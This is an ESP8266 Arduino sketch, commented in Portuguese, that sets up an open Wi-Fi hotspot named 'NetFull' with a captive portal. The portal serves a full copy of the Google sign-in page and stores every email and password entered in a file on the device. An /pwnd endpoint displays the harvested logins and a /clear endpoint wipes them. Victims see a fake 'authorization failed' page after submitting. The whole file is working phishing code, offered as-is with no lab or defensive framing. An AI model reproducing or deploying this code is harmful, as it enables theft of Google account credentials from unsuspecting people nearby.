#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>   // use LittleFS ao invés de SPIFFS

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

const char *ssid = "NetFull";
const char *password = "";

const char loginPage[] PROGMEM = R"rawliteral(

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in - Google accounts</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #fff;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        main {
            width: 360px;
            max-width: 90%;
            margin-top: 60px;
        }

        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .headingText {
            font-size: 24px;
            font-weight: 400;
            margin: 0;
        }

        .headingSubtext {
            font-size: 14px;
            color: #5f6368;
            margin: 8px 0 24px 0;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .identifierSubBox {
            position: relative;
            margin-bottom: 24px;
        }

        .identifierSubBox input {
            width: 100%;
            padding: 12px 0;
            font-size: 16px;
            border: none;
            border-bottom: 1px solid #dadce0;
            outline: none;
            transition: border-color 0.3s;
        }

        .identifierSubBox input:focus {
            border-bottom: 2px solid #1a73e8;
        }

        .forgotEmailBox {
            text-align: right;
            margin-bottom: 24px;
        }

        .forgotEmailBox a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        .aboutGuestMode {
            font-size: 12px;
            color: #5f6368;
            margin-bottom: 24px;
        }

        .aboutGuestMode a {
            color: #1a73e8;
            text-decoration: none;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
        }

        .buttons a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
        }

        .buttons input[type="submit"] {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            cursor: pointer;
            border-radius: 4px;
            transition: background-color 0.3s;
        }

        .buttons input[type="submit"]:hover {
            background-color: #1765c1;
        }

        footer {
            width: 100%;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
            margin-top: auto;
            padding: 20px 0 10px;
            border-top: 1px solid #dadce0;
        }

        footer ul {
            list-style: none;
            padding: 0;
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
        }

        footer ul li a {
            color: #5f6368;
            text-decoration: none;
        }

        .languageSelector {
            margin-bottom: 8px;
        }

        select {
            font-size: 12px;
            padding: 2px 4px;
        }
    </style>
</head>

<body>
    <main>
        <div class="logo">
            <!-- SVG do Google -->

            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <g>
                    <path fill="#ea4335"
                        d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z">
                    </path>
                </g>
                <g>
                    <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                </g>
                <g>
                    <path fill="#4285f4"
                        d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z">
                    </path>
                </g>
                <g>
                    <path fill="#fbbc05"
                        d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z">
                    </path>
                </g>
                <g>
                    <path fill="#ea4335"
                        d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z">
                    </path>
                </g>
                <g>
                    <path fill="#4285f4"
                        d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z">
                    </path>
                </g>
            </svg>
       
        </div>

        <div class="heading">
            <h1 class="headingText">Sign in</h1>
            <p class="headingSubtext">Use your Google Account</p>
        </div>

        <form action="/login" method="POST" novalidate>
            <div class="identifierBox">
                <div class="identifierSubBox">
                    <input type="email" name="email" id="emailID" autocomplete="username" tabindex="0"
                        spellcheck="false" aria-label="Email or phone" autocapitalize="none" required
                        placeholder="Enter your email or phone">
                </div>

                <div class="identifierSubBox">
                    <input type="password" name="pass" id="passID" autocomplete="current-password" tabindex="0"
                        spellcheck="false" aria-label="Password" autocapitalize="none" required
                        placeholder="Enter your password">
                </div>

                <div class="forgotEmailBox">
                    <a href="#" id="forgotEmail">Forgot email?</a>
                </div>
            </div>

            <p class="aboutGuestMode">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" target="_blank" aria-label="Learn more about using Guest mode">Learn more</a>
            </p>

            <div class="buttons">
                <a href="#" id="createAccountLink">Create account</a>
                <input type="submit" value="Next" id="nextButton">
            </div>
        </form>
    </main>

    <footer>
        <div class="languageSelector">
            <label for="langSelect">Language:</label>
            <select id="langSelect" name="language">
                <option value="en">English</option>
                <option value="pt">Português</option>
                <option value="es">Español</option>
            </select>
        </div>

        <ul>
            <li><a href="#" target="_blank">Help</a></li>
            <li><a href="#" target="_blank">Privacy</a></li>
            <li><a href="#" target="_blank">Terms</a></li>
        </ul>
    </footer>
</body>

</html>

)rawliteral";


const char loginTrue[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Error 1001</title>
</head>
  <body>
    <h1>Falha na autorização</h1>
    <p>Você não tem permissão para usar essa rede.</p>
    <a href="/">Voltar</a>
  </body>
</html>
)rawliteral";


void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleClear() {
  if (LittleFS.exists("/logins.txt")) {
    LittleFS.remove("/logins.txt");   // apaga o arquivo
    server.send(200, "text/html", "<h3>Log apagado com sucesso!</h3><a href='/pwnd'>Ver log</a>");
    Serial.println("Logins apagados!");
  } else {
    server.send(200, "text/html", "<h3>Nenhum log encontrado para apagar.</h3><a href='/pwnd'>Ver log</a>");
  }
}

void handleLogin() {
  String email = server.arg("email");
  String senha = server.arg("pass");

  // Cria a linha do log
  String logLine = "Usuario: " + email + " | Senha: " + senha + "\n";

  // Salva no arquivo (append)
  File f = LittleFS.open("/logins.txt", "a");
  if (f) {
    f.print(logLine);
    f.close();
    Serial.println("Salvo: " + logLine);
  }

    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);

  server.send(200, "text/html", loginTrue);
}

void handlePwnd() {
  String page = "<h2>Log de acessos</h2><pre>";

  File f = LittleFS.open("/logins.txt", "r");
  if (f) {
    while (f.available()) {
      page += char(f.read());
    }
    f.close();
  } else {
    page += "(nenhum dado salvo)";
  }

  page += "</pre>";
  server.send(200, "text/html", page);
}

// void onStationConnected(const WiFiEventSoftAPModeStationConnected& evt) {
//   Serial.println("Novo dispositivo conectado ao WiFi!");
//   digitalWrite(LED_BUILTIN, LOW);
//   delay(300);
//   digitalWrite(LED_BUILTIN, HIGH);
//   delay(300);
//   digitalWrite(LED_BUILTIN, LOW);
//   delay(300);
//   digitalWrite(LED_BUILTIN, HIGH);
// }

void setup() {
  Serial.begin(115200);

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);

  // registrar eventos
  // WiFi.onSoftAPModeStationConnected(onStationConnected);

  // inicia LittleFS
  if (!LittleFS.begin()) {
    Serial.println("Falha ao montar LittleFS!");
  }

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/pwnd", handlePwnd);
  server.on("/clear", handleClear);
  server.onNotFound(handleRoot);

  server.begin();
  Serial.print("IP do AP: ");
  Serial.println(WiFi.softAPIP());
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
